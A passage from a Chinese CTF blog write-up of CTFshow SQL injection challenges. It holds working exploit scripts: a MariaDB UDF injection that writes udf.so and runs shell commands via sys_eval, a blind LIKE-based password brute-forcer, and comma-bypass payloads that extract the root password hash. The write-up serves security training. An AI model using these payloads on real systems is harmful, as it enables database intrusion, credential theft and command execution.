class="string">&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新连接剩余数据</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(codes)):</span><br><span class="line">    commit_payload(<span class="string">&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[k]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.3.18-MariaDB</span></span><br><span class="line"><span class="comment"># 写入so文件</span></span><br><span class="line">commit_payload(<span class="string">&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so\&#x27;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 引入自定义函数</span></span><br><span class="line">commit_payload(<span class="string">&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;udf.so\&#x27;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行，结果更新到界面</span></span><br><span class="line">commit_payload(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;cat /flag.????&#x27;))&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看结果</span></span><br><span class="line">r = requests.get(url[:-<span class="number">4</span>] + <span class="string">&#x27;?page=1&amp;limit=10&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></div>



<p><strong>两个脚本都跑了一次，都ok，第一个要快些</strong></p>
<h1 id="quine注入"><a href="#quine注入" class="headerlink" title="quine注入"></a>quine注入</h1><p>Quine指的是自产生程序，简单的说，就是输入的sql语句与要输出的一致，下面是例题。</p>
<p>（比如，输入的password和数据库中存储的一样的时候才会输出flag）</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28457/index.php&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 使用前先看看过滤的内容有哪些</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">62</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;-1&#x27;/**/or/**/password/**/like/**/&#x27;<span class="subst">&#123;flag + j&#125;</span>%&#x27;#&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;something wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag = flag + j</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>









<h1 id="Nosql注入"><a href="#Nosql注入" class="headerlink" title="Nosql注入"></a>Nosql注入</h1><h2 id="web249-253"><a href="#web249-253" class="headerlink" title="web249 -253"></a>web249 -253</h2><p>nosql我还没学，待补充</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/recharging-runtime/p/15077477.html" >CTFSHOW WEB入门 SQL注入篇 - b477eRy - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h1 id="练题补充"><a href="#练题补充" class="headerlink" title="练题补充"></a>练题补充</h1><h2 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h2><p><strong>有回显</strong></p>
<p>原本union正常语句</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user_id,user,password from users union select 1,2,3;</span><br></pre></td></tr></table></figure></div>

<p>使用join绕过</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user_id,user,password from users union select * from ((select 1)A join (select 2)B join (select 3)C);</span><br></pre></td></tr></table></figure></div>



<h5 id="盲注中逗号绕过"><a href="#盲注中逗号绕过" class="headerlink" title="盲注中逗号绕过"></a>盲注中逗号绕过</h5><p>逗号绕过 SUBTTRING 函数<br>substring(str FROM pos)<br>从字符串str的起始位置pos 返回一个子串</p>
<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">union <span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="title">substring</span>(<span class="params">(<span class="keyword">select</span> password <span class="keyword">from</span> mysql.user <span class="keyword">where</span> user=<span class="string">&#x27;root&#x27;</span></span>) <span class="keyword">from</span> 1 <span class="keyword">for</span> 1)</span>=<span class="string">&#x27;e&#x27;</span> <span class="function">then <span class="title">sleep</span>(<span class="params"><span class="number">5</span></span>) <span class="keyword">else</span> 0 end #</span></span><br></pre></td></tr></table></figure></div>








        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>标题:</strong> CTFshow SQL注入解题记录</li>
        <li><strong>作者:</strong> Ko1sh1</li>
        <li><strong>创建于
                :</strong> 2021-12-24 09:55:59</li>
        
            <li>
                <strong>更新于
                    :</strong> 2024-05-30 21:58:30
            </li>
        
        <li>
            <strong>链接:</strong> https://ko1sh1.github.io/2021/12/24/blog_ctfshow_sql注入/
        </li>
        <li>
            <strong>
                版权声明:
            </strong>
            

            
                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/sql%E6%B3%A8%E5%85%A5/">#sql注入</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2022/01/08/blog_php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">php原生类利用</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                        </a>
                    </div>
                
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        评论
    </div>
    

        
            
    <div class="twikoo-container">
        <script data-swup-reload-script
                src='https://cdn.staticfile.org/twikoo/1.6.31/twikoo.all.min.js'
        ></script>
        <div id="twikoo-comment"></div>
        <script data-swup-reload-script>
            function loadTwikoo() {
                twikoo.init({
                    el: '#twikoo-comment',
                    envId: 'https://ko1sh1-blog-comments.hf.space',
                });
            }

            if ('true') {
                const loadTwikooTimeout = setTimeout(() => {
                    loadTwikoo();
                    clearTimeout(loadTwikooTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadTwikoo);
            }
        </script>
    </div>


        
        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">此页目录</div>
        <div class="page-title">CTFshow SQL注入解题记录</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-text">union联合注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#174%EF%BC%88%E9%99%90%E5%88%B6%E6%95%B0%E5%AD%97-replace%EF%BC%89"><span class="nav-text">174（限制数字-replace）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E6%AD%A5%E9%AA%A4"><span class="nav-text">关键步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E9%A2%98%E8%A7%A3%E6%AD%A5%E9%AA%A4"><span class="nav-text">具体题解步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#175-webshell-outfile"><span class="nav-text">175(webshell,outfile)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%951"><span class="nav-text">解法1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#playload"><span class="nav-text">playload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E6%93%8D%E4%BD%9C"><span class="nav-text">蚁剑操作</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A"><span class="nav-text">解法2：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#payload"><span class="nav-text">payload</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-text">过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#176%EF%BC%88%E7%BB%95%E8%BF%87select%EF%BC%89"><span class="nav-text">176（绕过select）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="nav-text">解法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="nav-text">解法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#177-179%EF%BC%88%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%89"><span class="nav-text">177-179（绕过空格）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95"><span class="nav-text">解法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#180%EF%BC%88%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6%EF%BC%89"><span class="nav-text">180（绕过注释符）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%951"><span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%952"><span class="nav-text">方法2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#180-182-%E5%AE%8C%E5%85%A8%E6%97%A0%E7%A9%BA%E6%A0%BC"><span class="nav-text">180-182(完全无空格)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#183%EF%BC%88from%E6%9F%A5%E8%AF%A2%E6%9C%AA%E7%A6%81where%EF%BC%89"><span class="nav-text">183（from查询未禁where）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#184%EF%BC%88%E7%A6%81%E7%94%A8where%E5%92%8C%E5%90%84%E7%A7%8D%E5%BC%95%E5%8F%B7%EF%BC%89"><span class="nav-text">184（禁用where和各种引号）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E6%B3%95"><span class="nav-text">做法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#185-186-%E7%A6%81%E7%94%A8%E4%BA%86%E6%95%B0%E5%AD%97%E5%92%8C%E5%BC%95%E5%8F%B7%EF%BC%8C%E6%84%8F%E5%91%B3%E7%9D%80174%E5%A4%B1%E6%95%88"><span class="nav-text">185-186(禁用了数字和引号，意味着174失效)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%95%B0%E5%AD%97"><span class="nav-text">构造数字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp%E7%BC%96%E5%86%99"><span class="nav-text">exp编写</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E7%B1%BB%E2%80%94%E2%80%94%E7%89%B9%E6%80%A7"><span class="nav-text">登录类——特性</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#187-%E7%BB%95%E8%BF%87-md5-str-true"><span class="nav-text">187(  绕过 md5($str,true)  )</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#188%EF%BC%88%E6%9C%89%E8%BF%87%E6%BB%A4%E7%9A%84%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E5%88%97%E5%90%8D%E5%BC%80%E5%A4%B4%E9%83%BD%E6%98%AF%E5%AD%97%E7%AC%A6%EF%BC%89"><span class="nav-text">188（有过滤的数字型注入_数据库账号密码列名开头都是字符）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A7%BF%E5%8A%BF"><span class="nav-text">新姿势</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web189%EF%BC%88%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%97%E5%90%8D%E7%9A%84%E5%BC%80%E5%A4%B4%E4%B8%8D%E6%AD%A2%E4%B8%80%E4%B8%AA%E6%98%AF%E6%95%B0%E5%AD%97%EF%BC%89"><span class="nav-text">web189（数据库列名的开头不止一个是数字）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E5%86%99exp"><span class="nav-text">尝试写exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%88%E8%8E%AB%E5%BE%97%E5%9B%9E%E6%98%BE%EF%BC%8C%E6%B7%A6%EF%BC%81%EF%BC%89"><span class="nav-text">布尔盲注（莫得回显，淦！）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#190-%E8%BF%99%E9%A2%98%E8%B4%A6%E5%8F%B7%E4%B9%9F%E6%98%AF%E6%95%B0%E5%AD%97%E5%BC%80%E5%A4%B4%E7%9A%84%E4%BA%86"><span class="nav-text">190(这题账号也是数字开头的了)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp%E7%BC%96%E5%86%99-1"><span class="nav-text">exp编写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#191%EF%BC%88%E5%92%8C%E4%B8%8A%E9%A2%98%E5%B7%AE%E4%B8%8D%E5%A4%9A%EF%BC%8C%E5%A4%9A%E4%BA%86%E5%B0%B1%E6%98%AF%E6%8A%8Aascii%E8%BF%87%E6%BB%A4%E4%BA%86%EF%BC%89"><span class="nav-text">191（和上题差不多，多了就是把ascii过滤了）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#192%EF%BC%88%E7%A6%81%E4%BA%86ord%EF%BC%8Cascii%EF%BC%89"><span class="nav-text">192（禁了ord，ascii）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%951-1"><span class="nav-text">解法1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%952"><span class="nav-text">解法2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#193-194-%E5%A4%9A%E7%A6%81%E4%BA%86substr"><span class="nav-text">193-194(多禁了substr)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99"><span class="nav-text">解法一：使用正则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8mid%E6%88%96%E8%80%85right%E3%80%81left"><span class="nav-text">解法二：使用mid或者right、left</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-text">堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#195%EF%BC%88%E6%9C%AA%E7%A6%81%EF%BC%9B%E5%92%8Cupdate%EF%BC%89"><span class="nav-text">195（未禁；和update）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-1"><span class="nav-text">payload:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#196%EF%BC%88%E6%B2%A1%E8%90%A5%E5%85%BB%E7%9A%84%E9%A2%98%EF%BC%89"><span class="nav-text">196（没营养的题）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#197-198%EF%BC%88%E6%9C%AA%E7%A6%81%EF%BC%9B%E5%92%8Calter%EF%BC%89"><span class="nav-text">197-198（未禁；和alter）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-2"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#199-200%EF%BC%88%E8%BF%98%E6%98%AF%EF%BC%9B%E5%92%8Calter%EF%BC%8C%E7%A8%8D%E5%8A%A0%E4%BF%AE%E6%94%B9%EF%BC%89"><span class="nav-text">199-200（还是；和alter，稍加修改）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-3"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-3"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#225%EF%BC%88%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5plus%EF%BC%8C%E5%A4%9A%E9%99%90%E5%88%B6%EF%BC%8C%E7%A6%81update%E3%80%81alter%EF%BC%89%E2%80%93%E5%AD%A6%E4%B9%A0handler%E5%92%8C%E9%A2%84%E5%A4%84%E7%90%86"><span class="nav-text">225（堆叠注入plus，多限制，禁update、alter）–学习handler和预处理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%951%E2%80%93handler"><span class="nav-text">解法1–handler</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%952%E2%80%93%E9%A2%84%E5%A4%84%E7%90%86"><span class="nav-text">解法2–预处理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#226%E3%80%81228-230%EF%BC%88%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5plus%EF%BC%8C%E5%86%8D%E5%A2%9E%E9%99%90%E5%88%B6%EF%BC%89"><span class="nav-text">226、228-230（堆叠注入plus，再增限制）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95-%E2%80%93-%E9%A2%84%E5%A4%84%E7%90%86"><span class="nav-text">解法 – 预处理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-4"><span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#227%EF%BC%88%E5%A0%86%E5%8F%A0-MySQL%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%92%8C%E5%87%BD%E6%95%B0%EF%BC%89"><span class="nav-text">227（堆叠-MySQL存储过程和函数）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-text">学习知识点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%92%8C%E5%87%BD%E6%95%B0%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-text">查看存储过程和函数的信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-4"><span class="nav-text">payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap%E4%BD%BF%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0"><span class="nav-text">sqlmap使用系统学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#201-206%EF%BC%88%E6%B2%A1%E5%95%A5%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E7%9A%84%E5%9C%B0%E6%96%B9%EF%BC%89"><span class="nav-text">201-206（没啥自己动手的地方）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#agent%E3%80%81referer"><span class="nav-text">(agent、referer)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#post-%E6%96%B9%E5%BC%8F%E6%8F%90%E4%BA%A4%E6%95%B0%E6%8D%AE"><span class="nav-text">post 方式提交数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#put-%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="nav-text">put 请求方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cookie"><span class="nav-text">__cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90"><span class="nav-text">_权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AD%E5%90%88"><span class="nav-text">_闭合</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#207-213%EF%BC%88%E9%9C%80%E8%A6%81%E8%87%AA%E5%B7%B1%E5%86%99tamper%EF%BC%89"><span class="nav-text">207-213（需要自己写tamper）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tamper%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC"><span class="nav-text">tamper绕过空格</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%BD%BF%E7%94%A8%E8%87%AA%E5%B8%A6%E7%9A%84tamper"><span class="nav-text">1.使用自带的tamper</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%87%AA%E5%B7%B1%E5%86%99%E4%B8%80%E4%B8%AAtamper"><span class="nav-text">2.自己写一个tamper</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tamper%E7%BB%95%E8%BF%87%E7%AD%89%E5%8F%B7"><span class="nav-text">tamper绕过等号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tamper%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86"><span class="nav-text">tamper加密解密</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E7%9C%8B%E9%A2%98%E7%9B%AE"><span class="nav-text">1.看题目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%80%9D%E8%80%83"><span class="nav-text">2.思考</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E7%BC%96%E5%86%99tamper"><span class="nav-text">3.编写tamper</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-payload"><span class="nav-text">4.payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E2%80%93os-shell-%E4%B8%80%E9%94%AEgetshell"><span class="nav-text">使用–os-shell 一键getshell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text">时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#214%EF%BC%88%E6%95%B4%E6%95%B0%E5%9E%8B%EF%BC%89"><span class="nav-text">214（整数型）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-5"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#215%EF%BC%88%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%89"><span class="nav-text">215（字符型）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-6"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#216%EF%BC%88%E5%AF%B9%E6%9F%A5%E8%AF%A2%E5%AF%B9%E8%B1%A1%E4%BD%BF%E7%94%A8%E4%BA%86%E5%B8%A6%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%89"><span class="nav-text">216（对查询对象使用了带括号的函数）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#217%EF%BC%88sleep%E5%B7%B2%E7%BB%8FGG%EF%BC%89"><span class="nav-text">217（sleep已经GG）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-7"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#218-219-sleep%E5%92%8Cbenchmark%E8%A2%AB%E7%A6%81"><span class="nav-text">218-219(sleep和benchmark被禁)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-8"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#220%EF%BC%88%E5%A4%9A%E7%A6%81%E4%BA%86substr%E5%92%8Cconcat%EF%BC%89"><span class="nav-text">220（多禁了substr和concat）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%AD%90%E5%8F%A5%E6%B3%A8%E5%85%A5"><span class="nav-text">其他子句注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#limit-%E6%B3%A8%E5%85%A5"><span class="nav-text">limit 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%84%E6%96%991"><span class="nav-text">资料1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%84%E6%96%992"><span class="nav-text">资料2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#221"><span class="nav-text">221</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#group-by%E6%B3%A8%E5%85%A5"><span class="nav-text">group by注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%84%E6%96%99"><span class="nav-text">资料</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#222"><span class="nav-text">222</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#223"><span class="nav-text">223</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4"><span class="nav-text">具体步骤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-9"><span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#update"><span class="nav-text">update</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" 